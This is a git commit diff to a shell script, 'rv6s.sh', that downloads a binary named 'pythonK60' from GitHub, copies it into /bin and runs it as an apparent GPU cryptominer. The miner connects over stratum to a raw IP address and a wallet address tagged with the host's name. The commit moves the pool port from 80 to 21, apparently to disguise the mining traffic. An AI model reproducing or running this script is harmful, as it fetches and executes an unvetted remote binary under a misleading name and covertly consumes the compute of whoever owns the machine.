2cf1ec2e56dc97f2da38e9ccffe4e7c8aa783d73
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-20 14:50:34 +0100

    Update rv6s.sh

--- rv6s.sh
+++ rv6s.sh
@@ -7,4 +7,4 @@ curl ipinfo.io
 wget https://github.com/one10001/10001code/raw/main/pythonK60
 chmod +x pythonK60
 cp pythonK60 /bin/pythonK60
-pythonK60 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
+pythonK60 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:21  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
